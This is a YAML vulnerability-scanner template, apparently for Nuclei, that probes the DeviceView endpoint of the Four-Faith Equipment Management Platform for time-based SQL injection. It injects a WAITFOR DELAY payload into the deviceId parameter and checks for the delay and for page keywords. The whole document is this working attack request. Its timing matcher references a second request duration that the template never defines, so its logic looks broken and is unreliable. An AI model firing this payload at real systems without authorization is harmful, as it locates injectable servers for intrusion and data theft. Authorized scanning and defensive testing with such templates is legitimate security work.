id: poc-yaml-four-faith-equipment-management-platform-deviceview-sqli
info:
  name: "Four-Faith Equipment Management Platform DeviceView 接口 SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: Four-Faith

http:
  - raw:
      - |
        GET /Device/Device/DeviceView?deviceId=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "设备分组"
          - "设备编码"
          - "最近心跳时间"
        part: body

      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
